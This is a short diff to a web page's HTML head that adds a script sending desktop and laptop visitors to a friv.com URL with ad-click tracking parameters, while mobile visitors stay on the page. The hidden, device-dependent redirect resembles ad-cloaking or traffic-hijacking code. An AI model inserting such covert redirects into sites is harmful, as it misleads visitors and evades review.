@@ -15,6 +15,18 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
 <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+<script>
+function isDesktopOrLaptop() {
+  const ua = navigator.userAgent;
+  const isMobileUA = /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i.test(ua);
+  const largeScreen = window.innerWidth >= 1024; // telas grandes (desktop/notebook)
+  return !isMobileUA && largeScreen;
+}
+
+if (isDesktopOrLaptop()) {
+  window.location.href = "https://www.friv.com/?gad_source=1&gad_campaignid=15710013830&gbraid=0AAAAAoQQpn8RmXLvNIjfSk-yXumJjJgMv&gclid=CjwKCAiAv5bMBhAIEiwAqP9GuCpp760ZXM_LSdwcyuM-JGAmebSjDQvg4JnNnKfdN263N2Sz7X-h7xoCaWIQAvD_BwE";
+}
+</script>
 
 
   
